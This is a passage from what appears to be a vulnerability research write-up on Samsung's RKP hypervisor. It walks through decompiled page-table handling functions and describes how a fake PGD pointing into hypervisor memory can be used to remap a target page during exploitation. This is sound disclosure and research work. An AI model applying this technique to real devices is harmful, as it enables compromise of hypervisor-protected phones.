  <span class="n">rkp_phys_map_unlock</span><span class="p">(</span><span class="n">table</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<div id="set_range_to_pxn_l3">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">set_range_to_pxn_l3</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">table</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">start_addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">end_addr</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">rkp_phys_map_lock</span><span class="p">(</span><span class="n">table</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">is_phys_map_kernel</span><span class="p">(</span><span class="n">table</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">is_phys_map_l3</span><span class="p">(</span><span class="n">table</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">rkp_s2_page_change_permission</span><span class="p">(</span><span class="n">table</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"rkp_l3pgt.c"</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="s">"pxn l3t failed, %lx"</span><span class="p">,</span> <span class="n">table</span><span class="p">);</span>
      <span class="n">rkp_phys_map_unlock</span><span class="p">(</span><span class="n">table</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">rkp_phys_map_set</span><span class="p">(</span><span class="n">table</span><span class="p">,</span> <span class="n">FREE</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">rkp_phys_map_unlock</span><span class="p">(</span><span class="n">table</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="n">next_start_addr</span> <span class="o">=</span> <span class="n">start_addr</span><span class="p">;</span>
  <span class="k">do</span> <span class="p">{</span>
    <span class="n">next_end_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">next_start_addr</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFF000</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">next_end_addr</span> <span class="o">&gt;</span> <span class="n">end_addr</span><span class="p">)</span>
      <span class="n">next_end_addr</span> <span class="o">=</span> <span class="n">end_addr</span><span class="p">;</span>
    <span class="n">table_desc_p</span> <span class="o">=</span> <span class="n">table</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">*</span> <span class="p">((</span><span class="n">next_start_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x1FF</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">table_desc_p</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">executable_regions_contains</span><span class="p">(</span><span class="o">*</span><span class="n">table_desc_p</span><span class="p">,</span> <span class="mi">3</span><span class="p">))</span>
      <span class="n">set_pxn_bit_of_desc</span><span class="p">(</span><span class="n">table_desc_p</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
    <span class="n">next_start_addr</span> <span class="o">=</span> <span class="n">next_end_addr</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">next_start_addr</span> <span class="o">&lt;</span> <span class="n">end_addr</span><span class="p">);</span>
  <span class="n">rkp_phys_map_unlock</span><span class="p">(</span><span class="n">table</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<p><code>rkp_set_range_to_pxn</code> is always called with <code>INIT_MM_PGD</code> (<code>swapper_pg_dir</code>)
 as its first argument. It will walk the kernel page tables (stage 1) 
and set the PXN bit of the pages and blocks spanning over the specified 
address range. The call to <code>rkp_s2_page_change_permission</code> only happens for level 3 tables that are marked <code>KERNEL|L3</code> in the <code>physmap</code>.</p>
<p>It is not the best option for many reasons: our target page of hypervisor memory would need to be marked <code>KERNEL|L3</code> in the <code>physmap</code>, it requires to have already written a user-controlled descriptor into the kernel page tables (bringing us back to the <code>rkp_lxpgt_process_table</code>
 functions that we have seen above), and the "dynamic load" feature is 
only available on Exynos devices, as we are going to see with the next 
vulnerability.</p>
<p><code>set_range_to_rox_l3</code> is called all the way from <code>rkp_set_range_to_rox</code>:</p>
<div id="rkp_set_range_to_rox">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">rkp_set_range_to_rox</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">table</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">start_addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">end_addr</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">res</span> <span class="o">=</span> <span class="n">set_range_to_rox_l1</span><span class="p">(</span><span class="n">table</span><span class="p">,</span> <span class="n">start_addr</span><span class="p">,</span> <span class="n">end_addr</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">res</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span> <span class="s">"rkp_l1pgt.c"</span><span class="p">,</span> <span class="mi">199</span><span class="p">,</span> <span class="s">"Fail to change attribute to rox"</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">size</span> <span class="o">=</span> <span class="n">end_addr</span> <span class="o">-</span> <span class="n">start_addr</span><span class="p">;</span>
  <span class="n">invalidate_s1_el1_tlb_region</span><span class="p">(</span><span class="n">start_addr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
  <span class="n">paddr</span> <span class="o">=</span> <span class="n">rkp_get_pa</span><span class="p">(</span><span class="n">start_addr</span><span class="p">);</span>
  <span class="n">invalidate_instruction_cache_region</span><span class="p">(</span><span class="n">paddr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<div id="set_range_to_rox_l1">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">set_range_to_rox_l1</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">table</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">start_addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">end_addr</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">table</span> <span class="o">!=</span> <span class="n">INIT_MM_PGD</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">rkp_policy_violation</span><span class="p">(</span><span class="s">"rox only allowed on kerenl PGD! l1t : %lx"</span><span class="p">,</span> <span class="n">table</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">rkp_phys_map_lock</span><span class="p">(</span><span class="n">table</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">is_phys_map_kernel</span><span class="p">(</span><span class="n">table</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">is_phys_map_l1</span><span class="p">(</span><span class="n">table</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">next_start_addr</span> <span class="o">=</span> <span class="n">start_addr</span><span class="p">;</span>
    <span class="n">res</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">do</span> <span class="p">{</span>
      <span class="n">next_end_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">next_start_addr</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFC0000000</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x40000000</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">next_end_addr</span> <span class="o">&gt;</span> <span class="n">end_addr</span><span class="p">)</span>
        <span class="n">next_end_addr</span> <span class="o">=</span> <span class="n">end_addr</span><span class="p">;</span>
      <span class="n">table_desc_p</span> <span class="o">=</span> <span class="n">table</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">*</span> <span class="p">((</span><span class="n">next_start_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">30</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x1FF</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">table_desc_p</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">set_rox_bits_of_desc</span><span class="p">(</span><span class="n">table_desc_p</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="n">set_range_to_rox_l2</span><span class="p">(</span><span class="o">*</span><span class="n">table_desc_p</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFF000</span><span class="p">,</span> <span class="n">next_start_addr</span><span class="p">,</span> <span class="n">next_end_addr</span><span class="p">);</span>
      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">table_desc_p</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">set_rox_bits_of_desc</span><span class="p">(</span><span class="n">table_desc_p</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">next_start_addr</span> <span class="o">=</span> <span class="n">next_end_addr</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">next_start_addr</span> <span class="o">&lt;</span> <span class="n">end_addr</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">res</span> <span class="o">=</span> <span class="mi">-1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">rkp_phys_map_unlock</span><span class="p">(</span><span class="n">table</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<div id="set_range_to_rox_l2">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">set_range_to_rox_l2</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">table</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">start_addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">end_addr</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">rkp_phys_map_lock</span><span class="p">(</span><span class="n">table</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">is_phys_map_kernel</span><span class="p">(</span><span class="n">table</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">is_phys_map_l2</span><span class="p">(</span><span class="n">table</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">next_start_addr</span> <span class="o">=</span> <span class="n">start_addr</span><span class="p">;</span>
    <span class="k">do</span> <span class="p">{</span>
      <span class="n">next_end_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">next_start_addr</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFE00000</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x200000</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">next_end_addr</span> <span class="o">&gt;</span> <span class="n">end_addr</span><span class="p">)</span>
        <span class="n">next_end_addr</span> <span class="o">=</span> <span class="n">end_addr</span><span class="p">;</span>
      <span class="n">table_desc_p</span> <span class="o">=</span> <span class="n">table</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">*</span> <span class="p">((</span><span class="n">next_start_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">21</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x1FF</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">table_desc_p</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">set_rox_bits_of_desc</span><span class="p">(</span><span class="n">table_desc_p</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="n">set_range_to_rox_l3</span><span class="p">(</span><span class="o">*</span><span class="n">table_desc_p</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFF000</span><span class="p">,</span> <span class="n">next_start_addr</span><span class="p">,</span> <span class="n">next_end_addr</span><span class="p">);</span>
      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">table_desc_p</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">set_rox_bits_of_desc</span><span class="p">(</span><span class="n">table_desc_p</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">next_start_addr</span> <span class="o">=</span> <span class="n">next_end_addr</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">next_start_addr</span> <span class="o">&lt;</span> <span class="n">end_addr</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">res</span> <span class="o">=</span> <span class="mi">-1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">rkp_phys_map_unlock</span><span class="p">(</span><span class="n">table</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<div id="set_range_to_rox_l3">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">set_range_to_rox_l3</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">table</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">start_addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">end_addr</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">rkp_phys_map_lock</span><span class="p">(</span><span class="n">table</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">is_phys_map_kernel</span><span class="p">(</span><span class="n">table</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="n">is_phys_map_l3</span><span class="p">(</span><span class="n">table</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">rkp_s2_page_change_permission</span><span class="p">(</span><span class="n">table</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"rkp_l3pgt.c"</span><span class="p">,</span> <span class="mi">193</span><span class="p">,</span> <span class="s">"rox l3t failed, %lx"</span><span class="p">,</span> <span class="n">table</span><span class="p">);</span>
      <span class="n">rkp_phys_map_unlock</span><span class="p">(</span><span class="n">table</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">rkp_phys_map_set</span><span class="p">(</span><span class="n">table</span><span class="p">,</span> <span class="n">FLAG2</span> <span class="o">|</span> <span class="n">KERNEL</span> <span class="o">|</span> <span class="n">L3</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">rkp_phys_map_unlock</span><span class="p">(</span><span class="n">table</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="n">next_start_addr</span> <span class="o">=</span> <span class="n">start_addr</span><span class="p">;</span>
  <span class="k">do</span> <span class="p">{</span>
    <span class="n">next_end_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">next_start_addr</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFF000</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">next_end_addr</span> <span class="o">&gt;</span> <span class="n">end_addr</span><span class="p">)</span>
      <span class="n">next_end_addr</span> <span class="o">=</span> <span class="n">end_addr</span><span class="p">;</span>
    <span class="n">table_desc_p</span> <span class="o">=</span> <span class="n">table</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">*</span> <span class="p">((</span><span class="n">next_start_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x1FF</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">table_desc_p</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span>
      <span class="n">set_rox_bits_of_desc</span><span class="p">(</span><span class="n">table_desc_p</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
    <span class="n">next_start_addr</span> <span class="o">=</span> <span class="n">next_end_addr</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">next_start_addr</span> <span class="o">&lt;</span> <span class="n">end_addr</span><span class="p">);</span>
  <span class="n">rkp_phys_map_unlock</span><span class="p">(</span><span class="n">table</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<p><code>rkp_set_range_to_rox</code> is also always called with <code>INIT_MM_PGD</code> (<code>swapper_pg_dir</code>)
 as its first argument. It will walk the kernel page tables (stage 1) 
and set the permissions bits of the pages and blocks spanning over the 
specified address range to make them read-only. The call to <code>rkp_s2_page_change_permission</code> also only happens for level 3 tables, but that are not marked either <code>KERNEL</code> or <code>L3</code> in the <code>physmap</code>.</p>
<p>It is not the best option either for similar reasons: the target page
 is set as read-only in the stage 2, it requires to already have written
 a user-controlled descriptor into the kernel page tables, and the 
"dynamic load" feature is only present on Exynos devices.</p>
<h4 id="the-remaining-options">The Remaining Options<a class="headerlink" href="#the-remaining-options" title="Permanent link">¶</a></h4>
<p>The last 2 functions that calls <code>rkp_s2_page_change_permission</code> are <a href="https://blog.impalabs.com/2101_samsung-rkp-compendium.html#rkp_set_pages_ro"><code>rkp_set_pages_ro</code></a> and <a href="https://blog.impalabs.com/2101_samsung-rkp-compendium.html#rkp_ro_free_pages"><code>rkp_ro_free_pages</code></a>. Unfortunately, they give to the <code>rkp_s2_page_change_permission</code> function an address that comes from a call to <code>rkp_get_pa</code>, so they are unusable for our exploit.</p>
<p>Finally, <code>rkp_s2_range_change_permission</code> is called from many <code>dynamic_load_xxx</code>
 functions, but as we have mentioned above, the "dynamic load" feature 
is only available on Exynos devices and we would like to keep the 
exploit as generic as possible.</p>
<h3 id="remapping-our-target-page">Remapping Our Target Page<a class="headerlink" href="#remapping-our-target-page" title="Permanent link">¶</a></h3>
<p>To exploit the vulnerability, we decided to use <code>rkp_l1pgt_new_pgd</code> and <code>rkp_l1pgt_free_pgd</code>. Since these functions call <code>rkp_l1pgt_process_table</code> with a physical address coming from <code>rkp_get_pa</code>, we will be targeting the <code>rkp_s2_range_change_permission</code> call in the <code>rkp_l2pgt_process_table</code> function instead. To reach this code, we can give as input to <code>rkp_l1pgt_process_table</code> a "fake PGD" that contains a single descriptor pointing to a "fake PMD" (our target hypervisor memory page).</p>
<p>The first step is to call <code>rkp_cmd_new_pgd</code>, which simply calls <code>rkp_l1pgt_new_pgd</code>.</p>
<p><code>rkp_l1pgt_new_pgd</code> calls <code>rkp_l1pgt_process_table</code>, that will process our "fake PGD" located in kernel memory (<code>high_bits</code> is 0 and <code>is_alloc</code> is 1):</p>
<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">rkp_l1pgt_process_table</span><span class="p">(</span><span class="kt">int64_t</span> <span class="n">pgd</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">high_bits</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">is_alloc</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>
  <span class="n">rkp_phys_map_lock</span><span class="p">(</span><span class="n">pgd</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">is_alloc</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">is_phys_map_l1</span><span class="p">(</span><span class="n">pgd</span><span class="p">))</span> <span class="p">{</span>
      <span class="n">rkp_phys_map_unlock</span><span class="p">(</span><span class="n">pgd</span><span class="p">);</span>
      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1">// ...</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">rkp_phys_map_set</span><span class="p">(</span><span class="n">pgd</span><span class="p">,</span> <span class="n">L1</span><span class="p">);</span>
    <span class="c1">// ...</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">rkp_s2_page_change_permission</span><span class="p">(</span><span class="n">pgd</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="c1">// ...</span>
  <span class="p">}</span>
  <span class="c1">// ...</span>
  <span class="c1">// for each descriptor</span>
  <span class="k">do</span> <span class="p">{</span>
    <span class="c1">// ...</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">desc</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">desc</span><span class="p">)</span>
        <span class="n">set_pxn_bit_of_desc</span><span class="p">(</span><span class="n">desc_p</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="n">addr</span> <span class="o">=</span> <span class="n">start_addr</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFF803FFFFFFF</span> <span class="o">|</span> <span class="n">offset</span><span class="p">;</span>
      <span class="n">res</span> <span class="o">+=</span> <span class="n">rkp_l2pgt_process_table</span><span class="p">(</span><span class="n">desc</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFF000</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">is_alloc</span><span class="p">);</span>
      <span class="n">set_pxn_bit_of_desc</span><span class="p">(</span><span class="n">desc_p</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">// ...</span>
  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">entry</span> <span class="o">!=</span> <span class="mh">0x1000</span><span class="p">);</span>
  <span class="n">rkp_phys_map_unlock</span><span class="p">(</span><span class="n">pgd</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p><code>rkp_l1pgt_process_table</code> changes the type of the page in the <code>physmap</code> to <code>L1</code>, sets the page as read-only in stage 2, then calls <code>rkp_l2pgt_process_table</code> on our "fake PMD" (our target page) located in hypervisor memory:</p>
<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">rkp_l2pgt_process_table</span><span class="p">(</span><span class="kt">int64_t</span> <span class="n">pmd</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">start_addr</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">is_alloc</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>
  <span class="n">rkp_phys_map_lock</span><span class="p">(</span><span class="n">pmd</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">is_alloc</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">is_phys_map_l2</span><span class="p">(</span><span class="n">pmd</span><span class="p">))</span> <span class="p">{</span>
      <span class="n">rkp_phys_map_unlock</span><span class="p">(</span><span class="n">pmd</span><span class="p">);</span>
      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1">// ...</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">rkp_phys_map_set</span><span class="p">(</span><span class="n">pmd</span><span class="p">,</span> <span class="n">L2</span><span class="p">);</span>
    <span class="c1">// ...</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">rkp_s2_page_change_permission</span><span class="p">(</span><span class="n">pmd</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="c1">// ...</span>
  <span class="p">}</span>
  <span class="c1">// ...</span>
  <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">!=</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">addr</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">|</span> <span class="n">start_addr</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFC01FFFFF</span><span class="p">;</span>
    <span class="n">res</span> <span class="o">+=</span> <span class="n">check_single_l2e</span><span class="p">(</span><span class="n">pmd</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">is_alloc</span><span class="p">);</span>
    <span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x200000</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">rkp_phys_map_unlock</span><span class="p">(</span><span class="n">pgd</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p><code>rkp_l2pgt_process_table</code> changes the type of the page in the <code>physmap</code> to <code>L2</code>, sets the page as read-only in the stage 2 page tables, then calls <code>check_single_l2e</code> on each entry of the "fake PMD" (that we don't have control of):</p>
<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">check_single_l2e</span><span class="p">(</span><span class="kt">int64_t</span><span class="o">*</span> <span class="n">desc_p</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">start_addr</span><span class="p">,</span> <span class="kt">signed</span> <span class="kt">int32_t</span> <span class="n">is_alloc</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>
  <span class="n">set_pxn_bit_of_desc</span><span class="p">(</span><span class="n">desc_p</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
  <span class="c1">// ...</span>
  <span class="n">desc</span> <span class="o">=</span> <span class="o">*</span><span class="n">desc_p</span><span class="p">;</span>
  <span class="n">type</span> <span class="o">=</span> <span class="o">*</span><span class="n">desc</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">type</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">type</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">desc</span><span class="p">)</span>
      <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"rkp_l2pgt.c"</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="s">"Invalid l2e %p %p %p"</span><span class="p">,</span> <span class="n">desc</span><span class="p">,</span> <span class="n">is_alloc</span><span class="p">,</span> <span class="n">desc_p</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">// ...</span>
  <span class="k">return</span> <span class="n">rkp_l3pgt_process_table</span><span class="p">(</span><span class="o">*</span><span class="n">desc_p</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFF000</span><span class="p">,</span> <span class="n">start_addr</span><span class="p">,</span> <span class="n">is_alloc</span><span class="p">,</span> <span class="n">protect</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p><code>check_single_l2e</code> will set the PXN bit of the descriptor 
(which in our case is each 8-byte value in our target page) and will 
process values that look like a table descriptor. That's something we 
will need to keep in mind when choosing our target page in hypervisor 
memory.</p>
<p>Up to this point, we have gotten our target page set as <code>L2</code> in the <code>physmap</code>, and read-only in the stage 2 page tables.</p>
<p>The second step is to call <code>rkp_cmd_free_pgd</code>, which calls <code>rkp_l1pgt_free_pgd</code>.</p>
